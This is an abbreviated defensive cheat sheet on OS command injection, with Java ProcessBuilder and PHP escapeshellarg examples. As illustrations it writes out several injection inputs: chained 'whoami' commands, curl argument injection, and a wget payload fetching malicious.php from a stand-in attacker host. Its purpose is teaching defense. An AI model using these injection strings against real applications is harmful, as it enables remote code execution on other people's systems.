# OS Command Injection Defense Cheat Sheet

## Introduction

OS Command Injection: software builds system command from externally influenced input, fails to neutralize special elements that modify intended command.

Example, supplied value:

``` shell
calc
```

typed in Windows command prompt → *Calculator* displayed.

Tampered value:

``` shell
calc & echo "test"
```

changes meaning of intended value. Both *Calculator* and *test* displayed.

Worse if compromised process violates least privilege: attacker commands run w/ special system privileges → more damage.

### Argument Injection

Every OS Command Injection is also Argument Injection: user input passed as arguments to specific command.

Example: user input passed through escape function escaping chars like `&`, `|`, `;`, etc.

```php

system("curl " . escape($url));
```

prevents running other commands.

But attacker-controlled string may contain additional `curl` argument:

```php

system("curl " . escape("--help"))
```

Code above outputs `curl --help`.

Impact depends on command used: **Information Disclosure** to critical **Remote Code Execution**.

## Primary Defenses

### Defense Option 1: Avoid calling OS commands directly

Primary defense: avoid calling OS commands directly. Built-in library functions are good alternative; cannot be manipulated beyond intended tasks.

E.g. use `mkdir()` instead of `system("mkdir /dir_name")`.

Libraries/APIs available for language → preferred method.

### Defense option 2: Escape values added to OS commands specific to each OS

E.g. PHP `escapeshellarg()`.

`escapeshellarg()` wraps user input in single quotes: malformed input like `& echo "hello"` → `calc '& echo "hello"'`, parsed as single argument to `calc`.

`escapeshellarg()` prevents OS Command Injection, but attacker can still pass single argument to command.

### Defense option 3: Parameterization in conjunction with Input Validation

If calling system command w/ user-supplied input unavoidable, use both layers:

#### Layer 1

**Parameterization:** if available, use structured mechanisms auto-enforcing data/command separation; provide quoting + encoding.

#### Layer 2

**Input validation:** validate both commands and arguments:

- **Commands:** validate against allowed-command list.
- **Arguments:** validate using:
    - **Positive/allowlist input validation:** explicitly define allowed arguments.
    - **Allowlist Regular Expression:** define allowed chars + max length. Exclude metacharacters (`Note A`) and whitespace from regex. E.g. allows only lowercase letters + numbers, length limited to 3-10: `^[a-z0-9]{3,10}$`
- Commands supporting it: use `--` to end option parsing. In curl, later arguments still URL operands: `--` does not prevent additional transfers. Pass exactly one validated URL as one argument via process API; disable curl URL globbing w/ `--globoff`. Never interpolate unquoted value into shell command. Argument separation ≠ destination validation; apply [SSRF protections](Server_Side_Request_Forgery_Prevention.md).

**Note A:**

```text
& |  ; $ > < ` \ ! ' " ( )
```

## Additional Defenses

Adopt all in addition to primary defenses, parameterization, input validation (defense in depth):

- Run applications w/ lowest privileges needed.
- If possible, isolated limited-privilege accounts used for single task only.

## Code examples

### Java

Java: use ProcessBuilder; separate command from arguments.

*Note on Java `Runtime.exec` behavior:*

Java `Runtime.exec` ≠ `C` system function (despite claims). Both invoke new program/process.

`C` system passes arguments to shell (`/bin/sh`) for parsing; `Runtime.exec` splits string into word array, executes first word w/ rest as parameters.

**`Runtime.exec` does NOT invoke shell at any point, no shell metacharacter support**.

Shell functionality usable for mischief (chaining w/ `&`, `&&`, `|`, `||`, etc, redirecting I/O) ends up as parameter to first command → likely syntax error or discarded as invalid parameter.

*Code to test the note above:*

``` java
String[] specialChars = new String[]{"&", "&&", "|", "||"};
String payload = "cmd /c whoami";
String cmdTemplate = "java -version %s " + payload;
String cmd;
Process p;
int returnCode;
for (String specialChar : specialChars) {
    cmd = String.format(cmdTemplate, specialChar);
    System.out.printf("#### TEST CMD: %s\n", cmd);
    p = Runtime.getRuntime().exec(cmd);
    returnCode = p.waitFor();
    System.out.printf("RC    : %s\n", returnCode);
    System.out.printf("OUT   :\n%s\n", IOUtils.toString(p.getInputStream(),
                      "utf-8"));
    System.out.printf("ERROR :\n%s\n", IOUtils.toString(p.getErrorStream(),
                      "utf-8"));
}
System.out.printf("#### TEST PAYLOAD ONLY: %s\n", payload);
p = Runtime.getRuntime().exec(payload);
returnCode = p.waitFor();
System.out.printf("RC    : %s\n", returnCode);
System.out.printf("OUT   :\n%s\n", IOUtils.toString(p.getInputStream(),
                  "utf-8"));
System.out.printf("ERROR :\n%s\n", IOUtils.toString(p.getErrorStream(),
                  "utf-8"));
```

*Result of the test:*

```text
##### TEST CMD: java -version & cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST CMD: java -version && cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST CMD: java -version | cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST CMD: java -version || cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST PAYLOAD ONLY: cmd /c whoami
RC    : 0
OUT   :
mydomain\simpleuser

ERROR :
```

*Incorrect usage:*

```java
ProcessBuilder b = new ProcessBuilder("C:\\DoStuff.exe -arg1 -arg2");
```

Creates builder w/ one command-list element, not program + two arguments. `ProcessBuilder` represents executable + arguments as list. Snippet starts no process, demonstrates no shell-command injection.

*Correct Usage:*

Illustrative: starts process w/ modified working directory, passes executable + each argument separately. Keep executable + working directory trusted; validate untrusted arguments for invoked program. Argument separation ≠ replacement for [argument validation](#layer-2).

``` java
ProcessBuilder pb = new ProcessBuilder("TrustedCmd", "TrustedArg1", "TrustedArg2");

Map<String, String> env = pb.environment();

pb.directory(new File("TrustedDir"));

Process p = pb.start();
```

### .Net

See [DotNet Security Cheat Sheet](DotNet_Security.md#os-injection)

### PHP

Two helpers when user input must reach shell: `escapeshellarg()`, `escapeshellcmd()`.

`escapeshellarg()`: user passes only one parameter, cannot add extra parameters, cannot execute different command.

`escapeshellcmd()`: user executes only intended command, unlimited parameters, no other commands.

Always prefer `escapeshellarg()` over `escapeshellcmd()` for user input.

E.g. `wget` w/ `escapeshellcmd()`:

```php
$url = $_GET['url'];
$command = 'wget --directory-prefix=..\temp ' . $url;
system(escapeshellcmd($command));
```

User provides:

```text
http://victim.com/download.php?url=--directory-prefix=. http://attacker.com/malicious.php
```

`escapeshellcmd()` still allows extra parameter → attacker overrides original `--directory-prefix`, saves file in current directory → remote command execution.

Safe: `escapeshellarg()` → URL is single argument:

```php
$url = $_GET['url'];
$command = 'wget --directory-prefix=..\temp ' . escapeshellarg($url);
system($command);
```

Malicious input becomes:

```text
wget --directory-prefix=..\temp '--directory-prefix=. http://attacker.com/malicious.php'
```

Second `--directory-prefix` is part of quoted string, not real option → attack fails.

Also:

- **Hardcode the command**: never let user choose executable.
- **Hardcode options**: required flags (e.g., `--directory-prefix`) in code, not user input.
- **Validate and restrict input as much as possible**: strict validation rules, whitelists, format checks → minimize attack surface.

## References

- SEI CERT C: Do not call system()
- CWE-77: Command Injection
